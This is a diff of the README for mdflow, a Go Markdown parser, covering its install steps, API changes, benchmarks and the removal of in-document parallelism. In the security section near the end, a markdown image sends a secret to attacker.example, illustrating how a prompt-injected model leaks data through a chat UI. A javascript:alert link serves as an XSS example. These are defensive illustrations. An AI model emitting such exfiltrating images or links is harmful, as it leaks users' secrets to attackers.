@@ -14,19 +14,26 @@ No syntax tree, no dependencies, one pass over the input, and an incremental
 mode built for producers that emit a document a few tokens at a time.
 
 ```
-go get github.com/Wenrh2004/mdflow
+go get github.com/Wenrh2004/mdflow                    # core: CommonMark, zero dependencies
+go get github.com/Wenrh2004/mdflow/extension/gfm      # or any single extension
+go get github.com/Wenrh2004/mdflow/all                # or every bundled flavour
 ```
+
+Each extension is its own module, so a program links only the syntax it
+imports. All modules are versioned in lockstep (`v0.1.0`,
+`extension/gfm/v0.1.0`, …); `go.work` wires them together for development, and
+`scripts/release.sh` tags them together.
 
 ---
 
 ## Architecture
 
 `mdflow` is a facade. It owns no syntax and no markup — it wires the layers
-below together and adds the chaining, streaming and fan-out surface.
+below together and adds the chaining and streaming surface.
 
 ```mermaid
 graph TD
-    mdflow["<b>mdflow</b><br/><i>facade: composition, chaining,<br/>streaming, fan-out</i>"]
+    mdflow["<b>mdflow</b><br/><i>facade: composition, chaining,<br/>streaming</i>"]
     extension["<b>extension</b><br/><i>capabilities: GFM · Memos · raw HTML</i>"]
     parser["<b>parser</b><br/><i>state machines, rules,<br/>the extension seam</i>"]
     html["<b>renderer/html</b><br/><i>HTML output</i>"]
@@ -54,7 +61,7 @@ graph TD
 | `renderer` | the `Renderer` interface and its optional capabilities | `token` |
 | `renderer/html` | the HTML implementation | `token`, `renderer` |
 | `extension` | capabilities: syntax paired with the output it produces | `token`, `parser`, `renderer` |
-| `mdflow` | composition, chaining, streaming, fan-out | all |
+| `mdflow` | composition, chaining, streaming | all |
 
 Dependencies point strictly downward — verified as a DAG, no cycles. Note what
 is *absent*: `extension` does not depend on `renderer/html`. It configures
@@ -87,10 +94,12 @@ Neither half is meaningful alone: a rule with no rendering parses text into a
 node nothing knows how to write. So they are declared side by side —
 
 ```go
+var strikeTag = token.NewTag("github.com/Wenrh2004/mdflow/extension/strikethrough.strikethrough")
+
 var Strikethrough = extension.Capability{
     Name:   "strikethrough",
-    Syntax: func(p *parser.RuleSet) { p.AddInlineRule(parser.Strikethrough()) },
-    Output: func(r renderer.Renderer) { /* register <del> for the tag */ },
+    Syntax: func(p *parser.RuleSet) { p.AddInlineRule(strikeRule{}) },
+    Output: func(r renderer.Renderer) { extension.Paired(r, strikeTag, "<del>", "</del>") },
 }
 ```
 
@@ -161,15 +170,19 @@ established rather than inventing a `Kind`-prefix scheme:
 | Node kinds | unprefixed — the package name is the qualifier | `reflect.Kind` → `reflect.Int` | `token.Heading`, `token.Link` |
 | Event types | `-Event` suffix | `html.NodeType` → `html.TextNode` | `mdflow.EnterEvent`, `mdflow.TextEvent` |
 | Block ops | `-Block` suffix | as above | `token.OpenBlock`, `token.LeafBlock` |
-| Extension tags | `Tag` prefix, naming the node not its markup | — | `token.TagStrikethrough`, `token.TagTable` |
+| Extension tags | import path + node name, naming the node not its markup | `gob.Register` type names | `token.NewTag(".../extension/table.cell")` |
 
 `token.KindHeading` would be stutter: the package already says `token`. The
 suffix on the event enum is not decoration either — it is what lets `token.Text`
 (a node) and `mdflow.TextEvent` (an event) coexist without collision.
 
-Tags name what the author wrote, never how it renders: `"strikethrough"`, not
-`"del"`. A terminal renderer strikes the run and a JSON renderer emits a type
-field, and neither should be handed a vocabulary of HTML element names.
+Tags name what the author wrote, never how it renders: `strikethrough`, not
+`del`. A terminal renderer strikes the run and a JSON renderer emits a type
+field, and neither should be handed a vocabulary of HTML element names. The
+name is also the tag's identity — the syntax half and the output half of a
+capability each ask for it and agree — so it is qualified by the defining
+package's import path, and two unrelated extensions cannot collide by both
+choosing `table`.
 
 The package is `token` and not `ast` because there is no tree. An `Inline`
 carries a `Close` flag instead of children — the representation a syntax tree
@@ -210,9 +223,8 @@ Block structure is strictly sequential — a line's meaning depends on the
 container stack above it. Most closed leaves proceed directly through inline
 parsing. If one reaches an unresolved reference, its cursor and the suffix
 behind it pause until a later definition resolves it or end of input seals the
-definition map. `Workers` runs only after that map is sealed and immutable; the
-dashed fast path can still bypass the public event stream when no middleware is
-installed.
+definition map. The dashed fast path bypasses the public event stream when no
+middleware is installed.
 
 ---
 
@@ -275,12 +287,12 @@ var forEmail = base.
 
 | Method | Effect |
 | --- | --- |
-| `Use(ext...)` | derive with extra syntax/renderer rules |
+| `With(opt...)` | derive with construction options (`WithSafeLinks()`, `WithURLPolicy(…)`, …) |
+| `WithExtensions(ext...)` | derive with extra syntax/renderer capabilities |
 | `Transform(mw...)` | append event middlewares |
 | `Map(f)` | rewrite every event |
 | `Filter(pred)` / `Reject(pred)` | keep / drop events |
 | `Tap(f)` | observe events, pass through |
-| `Workers(n)` | fan the inline phase across n cores (see [below](#parallelism-measured-not-assumed)) |
 
 Built-in middlewares: `ShiftHeadings`, `RewriteLinks`, `MapText`, `Drop`,
 `Unwrap`, plus `Compose` to fuse them.
@@ -296,7 +308,7 @@ generic combinators live in `iterx` as free functions, because Go does not allow
 type parameters on methods.
 
 ```go
-links := iterx.Collect(iterx.FilterMap(mdflow.Events(src),
+links := slices.Collect(iterx.FilterMap(mdflow.Events(src),
     func(e mdflow.Event) (string, bool) {
         return e.Dest, e.Type == mdflow.EnterEvent && e.Node == token.Link
     }))
@@ -313,7 +325,10 @@ the bundled capabilities; `Tagged` and `TaggedLeaf` build a predicate for any
 other, including one your own capability defines.
 
 `iterx.Map` · `FilterMap` · `Filter` · `Reject` · `TakeWhile` · `Take` ·
-`Reduce` · `Collect` · `Each` · `Count` · `Find` · `Compose`
+`Reduce` · `Each` · `Count` · `Find` · `Compose`
+
+Materialise a sequence with the standard library's `slices.Collect`; `iterx`
+does not duplicate it.
 
 Prebuilt folds: `Text(src)` (markup-stripped plain text) and `Headings(src)`
 (the outline), each in a single pass with no rendering.
@@ -325,12 +340,22 @@ s := md.Stream()
 for chunk := range llmTokens {
     io.WriteString(w, s.Feed(chunk)) // HTML that just became final
 }
-io.WriteString(w, s.Close())
+io.WriteString(w, s.Finish())
 ```
 
 `Provisional()` renders the not-yet-closed tail, so a UI always has something
 displayable between chunks. Chunk boundaries never affect the result — a test
 asserts byte-identical output for chunk sizes from 1 to 4096.
+
+When the output is itself a writer, `NewWriter` gives the same stream the shape
+of `gzip.Writer`: an `io.WriteCloser` that forwards HTML as it becomes final,
+with sticky errors.
+
+```go
+w := md.NewWriter(resp)   // any io.Writer
+io.Copy(w, modelOutput)   // or io.WriteString(w, chunk) per token
+w.Close()                 // flushes the tail; does not close resp
+```
 
 ### Extending
 
@@ -369,35 +394,61 @@ Both live in one value, which is why neither can ship half of itself.
 ## Benchmarks vs gomark
 
 Compared against [`github.com/usememos/gomark`](https://github.com/usememos/gomark)
-(`v0.0.0-20251021153759`), the parser behind Memos.
+(`v0.0.0-20251021153759`), the parser behind Memos, on every dimension a
+production user feels — not only speed and memory. Everything below is
+reproduced by `go test -bench . -benchmem -run 'Conformance|Safety|BinarySize' -v ./bench/...`;
+raw output is in [`bench/results.txt`](bench/results.txt).
+
+```
+goos: linux  goarch: amd64  cpu: Intel Xeon @ 2.10GHz (4 vCPU)  go1.26.0
+```
 
 Both libraries run the **same input** doing the **same job**. The corpus uses
 only constructs both parsers support — headings, prose with emphasis / strong /
 inline code / links, fenced code, lists, task lists, blockquotes, tables,
-hashtags, highlights, strikethrough and inline math — so the numbers measure
-parsing, not one library skipping syntax it does not implement. A test in the
-bench module (`TestOutputsAreComparable`) asserts that both outputs actually
-contain every construct.
+hashtags, highlights, strikethrough and inline math — and
+`TestOutputsAreComparable` asserts that both outputs contain every construct.
 
-```
-goos: darwin  goarch: arm64  cpu: Apple M4 Pro  go1.26
-go test -run '^$' -bench . -benchmem ./bench/...
-```
+### Throughput and memory
 
 | Workload | mdflow | gomark | Speedup | mdflow allocs | gomark allocs |
 | --- | ---: | ---: | ---: | ---: | ---: |
-| Markdown → HTML, 3.4 KiB | **32.2 µs** | 881 µs | **27×** | 213 | 24,068 |
-| Markdown → HTML, 34 KiB | **324 µs** | 78.6 ms | **242×** | 2,104 | 1,772,717 |
-| Markdown → HTML, 344 KiB | **3.36 ms** | 6.57 s | **1953×** | 21,027 | 170,772,639 |
-| Render into `io.Writer`, 34 KiB | **324 µs** | 82.8 ms | **256×** | 2,103 | 1,772,717 |
-| Parse structure only, 34 KiB | **73.9 µs** | 83.3 ms | **1127×** | 250 | 1,772,449 |
-| Streaming, 64-byte chunks, 3.4 KiB | **39.2 µs** | 19.9 ms | **507×** | 517 | 489,167 |
-| Plain-text extraction, 34 KiB | **323 µs** | 87.9 ms | **272×** | 2,106 | 1,778,118 |
-| Markup-light prose, 46 KiB | **76.5 µs** | 88.8 ms | **1160×** | 402 | 1,047,156 |
-| Concurrent (14 cores), 34 KiB | **214 µs** | 41.9 ms | **196×** | 2,113 | 1,772,723 |
+| Markdown → HTML, 3.4 KiB | **80 µs** | 2.45 ms | **30×** | 100 | 24,068 |
+| Markdown → HTML, 34 KiB | **823 µs** | 204 ms | **248×** | 955 | 1,772,717 |
+| Markdown → HTML, 344 KiB | **8.27 ms** | 14.1 s | **1700×** | 9,512 | 170,772,637 |
+| Render into `io.Writer`, 34 KiB | **765 µs** | 223 ms | **291×** | 954 | 1,772,719 |
+| Parse structure only, 34 KiB | **418 µs** | 223 ms | **533×** | 650 | 1,772,449 |
+| Plain-text extraction, 34 KiB | **844 µs** | 229 ms | **271×** | 974 | 1,778,119 |
+| Markup-light prose, 46 KiB | **284 µs** | 254 ms | **893×** | 3 | 1,047,159 |
+| Concurrent (4 cores), 34 KiB | **285 µs** | 140 ms | **492×** | 956 | 1,772,723 |
 
-mdflow is faster on every workload measured, allocates 113×–8122× fewer objects,
-and sustains 100–620 MB/s where gomark sustains 0.05–3.8 MB/s.
+### Every other dimension
+
+| Dimension | mdflow | gomark |
+| --- | ---: | ---: |
+| CommonMark 0.31.2 examples correct (`TestConformance`) | **652 / 652** | 100 / 652 |
+| Streaming a 3.4 KiB answer in 64-byte chunks, whole stream | **96 µs** (incremental) | 55 ms (re-parse) |
+| Per-chunk refresh latency, p50 / p99 (`BenchmarkChunkLatency`) | **4.9 µs / 88 µs** | 2.69 ms / 8.47 ms |
+| Worst case: 1 000 nested list markers | **0.62 ms** | 23.5 ms |
+| Worst case: 1 000 unmatched `[` | **0.07 ms** | 134 ms |
+| Worst case: 1 000 unmatched backticks | **0.11 ms** | 457 ms |
+| Worst case: 1 000 unmatched `[[` | **0.25 ms** | 2.80 s |
+| Worst case: a 1 000-line paragraph | **0.43 ms** | 84.8 ms |
+| Ready parser + first render (`BenchmarkConstruct`) | **0.54 µs**, 4 allocs | 2.31 µs, 37 allocs |
+| Attacker HTML reaching output (`TestSafety`) | 0 / 5 | 0 / 5 |
+| Output bounded by input (fuzzed invariant) | **yes** — reference and table-padding budgets | no |
+| Stripped binary size added (`TestBinarySize`) | 464 KiB core · 624 KiB `all` | **328 KiB** |
+
+Binary size is the one row mdflow does not win, and the reason is the first
+row: a complete CommonMark implementation carries the HTML entity table and
+the Unicode case-folding table the spec requires. See [#17](https://github.com/Wenrh2004/mdflow/issues/17) for what can
+still be trimmed.
+
+For reference, against [goldmark](https://github.com/yuin/goldmark) v1.8.6 —
+the de-facto fast Go library, same GFM subset, same XHTML output
+(`BenchmarkGoldmarkReference`): **9.27 ms vs 16.4 ms** on 200 KiB of mixed
+Markdown (1.8×, 7.6× fewer allocations) and **200 µs vs 458 µs** on 46 KiB of
+prose (2.3×).
 
 ### Where the gap comes from
 
@@ -427,10 +478,10 @@ mdflow stays flat per byte. Three concrete causes:
 
 The streaming row deserves its own note. gomark has no incremental mode, so a
 streaming UI must re-parse on every chunk. The bench module also measures that
-same naive strategy *on mdflow* (`mdflow-reparse`: 566 µs) to separate the two
-effects. Under the identical naive strategy mdflow is **19×** faster than gomark
+same naive strategy *on mdflow* (`mdflow-reparse`: 2.5 ms) to separate the two
+effects. Under the identical naive strategy mdflow is **22×** faster than gomark
 — that is raw single-pass speed. Switching mdflow from naive to incremental buys
-a further **18×** — that is the architecture. Together they give the 346× in the
+a further **26×** — that is the architecture. Together they give the 572× in the
 table. Only the small document is
 measured for `gomark-reparse` — on the medium one, re-parsing compounds gomark's
 own superlinear cost into minutes per iteration.
@@ -450,9 +501,11 @@ own superlinear cost into minutes per iteration.
   `<span class="tag">` where gomark emits a bare `<span>`, and renders inline
   math as `<code class="language-math">` rather than `<code>`. Equivalent
   structure, more useful attributes.
-- Single machine, single architecture (Apple M4 Pro, arm64). Reproduce with
+- Single machine, single architecture. Absolute numbers say more about the
+  machine than the library; the ratios are what carry over. Reproduce with
   `go test -bench . -benchmem ./bench/...`; raw output is in
-  [`bench/results.txt`](bench/results.txt).
+  [`bench/results.txt`](bench/results.txt). The complexity-class table above
+  was recorded on an Apple M4 Pro.
 
 ### Where the two disagree
 
@@ -474,60 +527,34 @@ parses that mdflow does not.
 
 ---
 
-## Parallelism: measured, not assumed
+## Parallelism: across documents, not within one
 
-CommonMark's appendix A notes that block structure is inherently sequential.
-mdflow completes that phase and seals the document's reference definitions
-before fan-out; each worker then parses closed leaves against the same immutable
-resolver. `Workers(n)` distributes that phase — and it is off by default,
-because it only pays under conditions worth stating precisely.
+CommonMark's appendix A notes that block structure is inherently sequential;
+only the inline phase, once reference definitions are sealed, could fan out
+within a single document. mdflow used to offer that as `Workers(n)`. It has
+been removed.
+
+It stopped paying. When the inline scanner got roughly twice as fast, the one
+phase that distributes became a small share of the work: on a 4-vCPU Xeon the
+fan-out bought 1.02×–1.11× on 128 KiB–2 MiB documents at two to three times the
+memory, and on a machine whose cores were already busy it was 18% *slower*
+than staying on one core. An option that is rarely worth enabling, and hurts
+when a server is loaded, costs more to carry — a second render path, worker
+panic plumbing, a reference budget that had to be made order-independent —
+than it returns.
+
+Parallelism belongs one level up. A `Parser` is immutable and safe to share,
+so a server renders many documents on many cores with no coordination at all:
 
 ```go
-md := mdflow.New().Workers(0) // 0 = GOMAXPROCS
-html := md.HTML(bigDoc)       // byte-identical to the sequential path
+var md = mdflow.New()
+
+// called from any number of goroutines at once
+func handle(w http.ResponseWriter, src string) { md.Render(w, src) }
 ```
 
-| Document | Speedup | Memory |
-| --- | ---: | ---: |
-| 14 KiB | **1.15×** | +5% |
-| 43 KiB | **1.04×** | +7% |
-| 175 KiB | **1.45×** | +22% |
-| 511 KiB | **1.89×** | +17% |
-| 2 MiB | **1.98×** | +23% |
-| 175 KiB, all cores busy | **1.68×** | +18% |
-
-Apple M4 Pro, 14 cores, dense mixed corpus — one document shape scaled by
-section count, so only size varies. Ratios rather than absolute times, because
-absolutes say more about the machine that ran them than about the library.
-
-Worker scaling at 511 KiB: 1.47× at 2, 1.72× at 4, 1.87× at 8, 2.02× at 14 —
-Amdahl's ceiling, since only the inline phase distributes. Past 4 workers you
-are buying very little.
-
-**Granularity is the whole game.** The obvious design — one goroutine per block,
-the classic actor fan-out — is *an order of magnitude slower* than staying on one
-core: a block's few microseconds of work cannot pay for a goroutine handoff, and
-a CPU profile is nothing but `selectgo`, `park_m` and `runqsteal`. This
-implementation instead partitions the block-event stream into one large
-contiguous range per worker, so a single handoff amortises over thousands of
-blocks.
-
-**What it costs.** Fan-out must hold the whole document's block events at once,
-where the sequential path streams them and keeps only the top of the container
-stack. That is the +5–23% memory above, and it is why this is opt-in. It also
-cannot be combined with a middleware chain (a `Middleware` may carry state across
-the whole stream), and inputs under 16 KiB fall back to sequential.
-
-> An earlier revision of this code sized the event buffer with a bad heuristic
-> and re-grew it several times per document. That alone made fan-out *slower*
-> than sequential at every size under 512 KiB and cost 2.7× memory. Pooling the
-> buffer across calls is what turned a losing feature into a winning one — worth
-> remembering before concluding that an architecture does not pay.
-
-`TestParallelCrossover` asserts the fan-out still gives ≥1.5× on a document four
-times the threshold. If a future optimisation shrinks the inline share of the
-work, that test fails, and the honest response is to delete `Workers` rather than
-keep an option that does nothing.
+`BenchmarkParallel` measures exactly that — every core rendering its own
+document through one shared parser.
 
 ---
 
@@ -578,6 +605,29 @@ too, so a source-level filter downstream would miss it. Pass
 mdflow.New().HTML("[x](javascript:alert(1))")                    // href="javascript:alert(1)"
 mdflow.New(mdflow.WithSafeLinks()).HTML("[x](javascript:alert(1))") // href="" — inert
 ```
+
+**Model output needs one more guard.** A prompt-injected model can emit
+`![](https://attacker.example/?q=<secret>)`, and a chat UI that renders it leaks
+the secret the moment the page loads — no click, and an ordinary `https` URL
+that scheme filtering cannot see. `WithURLPolicy` vets every link and image
+destination; `html.AllowImageHosts` loads images only from hosts you name,
+parsing them the way a browser does (backslashes, missing slashes, userinfo and
+ports included). A refused image renders as its alt text and is never fetched:
+
+```go
+md := mdflow.New(
+    mdflow.WithSafeLinks(),
+    mdflow.WithURLPolicy(html.AllowImageHosts("cdn.example.com")),
+)
+```
+
+**Resource limits are built in.** Output stays linear in input on every
+profile: reference expansion is budgeted at `max(input size, 100 KiB)` as in
+cmark, GFM tables stop padding short rows after 512 Ki synthesised cells as in
+cmark-gfm, and a fuzz invariant asserts the bound. Raw HTML for semi-trusted
+content can use GFM's tagfilter, `rawhtml.WithFilteredHTML()`, which keeps
+ordinary tags but disarms `<script>`, `<style>`, `<iframe>`, `<textarea>` and
+the other page-swallowing tags.
 
 ---
 
